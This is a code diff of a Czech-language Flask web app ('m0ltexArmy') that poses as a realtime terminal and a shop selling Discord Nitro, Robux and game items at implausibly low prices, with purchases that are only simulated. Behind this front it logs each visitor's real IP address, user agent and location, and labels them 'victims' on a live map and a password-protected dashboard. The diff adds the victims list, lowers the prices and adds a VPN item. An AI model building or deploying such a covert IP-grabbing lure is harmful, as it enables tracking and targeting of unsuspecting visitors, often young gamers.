@@ -8,22 +8,18 @@ app = Flask(__name__)
 app.secret_key = "m0ltex_final_secret_2026"
 socketio = SocketIO(app, cors_allowed_origins="*")
 
-# ====================== DATABASE ======================
 def init_db():
     conn = sqlite3.connect("data.db")
     c = conn.cursor()
     c.execute("""CREATE TABLE IF NOT EXISTS visits (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    ip TEXT, user_agent TEXT, referrer TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+                    ip TEXT, user_agent TEXT, referrer TEXT,
+                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                 )""")
     c.execute("""CREATE TABLE IF NOT EXISTS unique_visits (
-                    ip TEXT PRIMARY KEY,
-                    first_visit DATETIME,
-                    last_visit DATETIME,
-                    visits INTEGER DEFAULT 1,
-                    user_agent TEXT,
-                    country TEXT,
-                    city TEXT
+                    ip TEXT PRIMARY KEY, first_visit DATETIME,
+                    last_visit DATETIME, visits INTEGER DEFAULT 1,
+                    user_agent TEXT, country TEXT, city TEXT
                 )""")
     conn.commit()
     conn.close()
@@ -34,13 +30,12 @@ def get_real_ip():
     headers = ['CF-Connecting-IP', 'X-Forwarded-For', 'X-Real-IP', 'True-Client-IP']
     for h in headers:
         ip = request.headers.get(h)
-        if ip:
-            return ip.split(',')[0].strip()
+        if ip: return ip.split(',')[0].strip()
     return request.remote_addr
 
 def get_location(ip):
     try:
-        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city", timeout=4)
+        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city", timeout=5)
         data = r.json()
         if data.get("status") == "success":
             return data.get("country", "Unknown"), data.get("city", "Unknown")
@@ -97,7 +92,7 @@ def home():
     <a href="/dashboard">Dashboard</a>
 </div>
 <div class="main">
-    <h1>REALTIME TERMINAL v2.5</h1>
+    <h1>REALTIME TERMINAL v2.6</h1>
     <p>Online: <span id="online">0</span></p>
     <div id="terminal"></div>
     <input id="cmd" placeholder="Napiš /help ...">
@@ -117,17 +112,17 @@ document.getElementById("cmd").addEventListener("keypress", e => {
     }
 });
 
-// Matrix Rain
+// Lepší Matrix Rain
 const canvas = document.getElementById("rain");
 const ctx = canvas.getContext("2d");
 canvas.height = window.innerHeight;
 canvas.width = window.innerWidth;
 const chars = "01アイウエオ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
-const fontSize = 14;
+const fontSize = 13;
 const drops = Array(Math.floor(canvas.width / fontSize)).fill(1);
 
 function draw() {
-    ctx.fillStyle = "rgba(0,0,0,0.07)";
+    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
     ctx.fillRect(0, 0, canvas.width, canvas.height);
     ctx.fillStyle = "#00ff41";
     ctx.font = fontSize + "px monospace";
@@ -138,13 +133,13 @@ function draw() {
         drops[i]++;
     }
 }
-setInterval(draw, 35);
+setInterval(draw, 40);
 </script>
 </body>
 </html>
 """
 
-# ====================== SHOP ======================
+# ====================== SHOP (levnější ceny) ======================
 @app.route("/shop")
 def shop():
     return """
@@ -153,18 +148,23 @@ def shop():
     <div style="display:flex; gap:25px; flex-wrap:wrap;">
         <div style="background:#111; border:2px solid #ff0000; padding:25px; width:340px;">
             <h2>Discord Nitro Boost</h2>
-            <p><s>99.99$</s> → <strong style="color:#00ff00;">11.99$/rok</strong></p>
+            <p><s>99.99$</s> → <strong style="color:#00ff00;">4.99$/rok</strong></p>
             <button onclick="alert('Nákup proběhl úspěšně (simulace)')" style="padding:14px 40px; background:#ff0000; color:black; border:none; cursor:pointer;">Koupit</button>
         </div>
         <div style="background:#111; border:2px solid #ff0000; padding:25px; width:340px;">
             <h2>MM2 Godly + Ancient Set</h2>
-            <p><strong>16.99$</strong></p>
+            <p><strong>5.99$</strong></p>
             <button onclick="alert('Skins přidány! (simulace)')" style="padding:14px 40px; background:#ff0000; color:black; border:none; cursor:pointer;">Koupit</button>
         </div>
         <div style="background:#111; border:2px solid #ff0000; padding:25px; width:340px;">
             <h2>50 000 Robux</h2>
-            <p><strong>24.99$</strong></p>
+            <p><strong>8.99$</strong></p>
             <button onclick="alert('Robux přidány (simulace)')" style="padding:14px 40px; background:#ff0000; color:black; border:none; cursor:pointer;">Koupit</button>
+        </div>
+        <div style="background:#111; border:2px solid #ff0000; padding:25px; width:340px;">
+            <h2>Private VPN (1 rok)</h2>
+            <p><strong>3.99$</strong></p>
+            <button onclick="alert('VPN aktivován (simulace)')" style="padding:14px 40px; background:#ff0000; color:black; border:none; cursor:pointer;">Koupit</button>
         </div>
     </div>
     <br><a href="/" style="color:#ff6666;">← Zpět</a>
@@ -176,43 +176,42 @@ def shop():
 def map_page():
     conn = sqlite3.connect("data.db")
     c = conn.cursor()
-    c.execute("SELECT ip, country, city, last_visit FROM unique_visits WHERE country != 'Unknown' ORDER BY last_visit DESC LIMIT 30")
+    c.execute("SELECT ip, country, city, last_visit FROM unique_visits WHERE country != 'Unknown' ORDER BY last_visit DESC LIMIT 50")
     victims = c.fetchall()
     conn.close()
 
     markers = []
     for ip, country, city, time in victims:
-        markers.append(f'["{ip}", "{country or "Unknown"}", "{city or "Unknown"}", "{time}"]')
+        markers.append(f'["{ip}", "{country}", "{city}", "{time}"]')
 
     return f"""
     <body style="background:#000; color:#00ffcc; font-family:monospace; margin:0;">
-    <h1 style="color:#ff0000; text-align:center; padding:15px; background:#111; margin:0;">LIVE VICTIMS MAP</h1>
+    <h1 style="color:#ff0000; text-align:center; padding:15px; background:#111;">LIVE VICTIMS MAP</h1>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <div id="map" style="height:calc(100vh - 60px); width:100%;"></div>
+    <div id="map" style="height:calc(100vh - 60px);"></div>
     <script>
         var map = L.map('map').setView([20, 0], 2);
         L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png').addTo(map);
         var data = [{",".join(markers)}];
         data.forEach(item => {{
-            L.marker([Math.random()*140 - 70, Math.random()*300 - 150]).addTo(map)
+            var lat = (Math.random() * 140) - 70;
+            var lon = (Math.random() * 300) - 150;
+            L.marker([lat, lon]).addTo(map)
              .bindPopup(`<b>${{item[0]}}</b><br>${{item[1]}} - ${{item[2]}}<br>${{item[3]}}`);
         }});
     </script>
-    <a href="/" style="position:absolute; top:20px; right:20px; color:#ff6666; z-index:1000; text-decoration:none;">← Home</a>
+    <a href="/" style="position:absolute;top:20px;right:20px;color:#ff6666;z-index:1000;">← Home</a>
     </body>
     """
 
-# ====================== LOGIN + DASHBOARD + LOGOUT ======================
+# ====================== LOGIN + DASHBOARD ======================
 @app.route("/login", methods=["GET", "POST"])
 def login():
     if request.method == "POST":
         key = request.form.get("key", "")
-        if key == "FOUNDER123":
-            session["role"] = "founder"
-            return redirect("/dashboard")
-        elif key == "STAFF123":
-            session["role"] = "staff"
+        if key in ["FOUNDER123", "STAFF123"]:
+            session["role"] = "founder" if key == "FOUNDER123" else "staff"
             return redirect("/dashboard")
         else:
             return "<h2 style='color:red;text-align:center;margin-top:100px;'>Špatné heslo!</h2><br><a href='/login'>← Zpět</a>"
@@ -230,14 +229,31 @@ def login():
 def dashboard():
     if "role" not in session:
         return redirect("/login")
-    return f"<h1 style='color:#ff0000;text-align:center;margin-top:100px;'>CONTROL PANEL — {session['role'].upper()}</h1><br><a href='/logout'>Logout</a>"
+    conn = sqlite3.connect("data.db")
+    c = conn.cursor()
+    c.execute("SELECT COUNT(*) FROM visits"); total = c.fetchone()[0]
+    c.execute("SELECT COUNT(*) FROM unique_visits"); unique = c.fetchone()[0]
+    c.execute("SELECT ip, last_visit, country FROM unique_visits ORDER BY last_visit DESC LIMIT 15")
+    last = c.fetchall()
+    conn.close()
+    
+    last_html = "<br>".join([f"{ip} | {country} | {time}" for ip, time, country in last])
+    
+    return f"""
+    <body style="background:#000; color:#00ffcc; font-family:monospace; padding:30px;">
+    <h1 style="color:#ff0000;">CONTROL PANEL — {session['role'].upper()}</h1>
+    <p>Total visits: <b>{total}</b> | Unique victims: <b>{unique}</b></p>
+    <h2>Poslední oběti:</h2>
+    <div style="background:#111; padding:15px; border:1px solid #ff0000;">{last_html}</div>
+    <br><a href="/logout" style="color:#ff6666;">Logout</a>
+    </body>
+    """
 
 @app.route("/logout")
 def logout():
     session.clear()
     return redirect("/")
 
-# ====================== SOCKET ======================
 online_users = 0
 
 @socketio.on("connect")
@@ -253,5 +269,5 @@ def disconnect():
     emit("online", online_users, broadcast=True)
 
 if __name__ == "__main__":
-    print("✅ m0ltexArmy v2.5 FIXED - Started")
+    print("✅ m0ltexArmy v2.6 FINAL")
     socketio.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 10000)), debug=False)
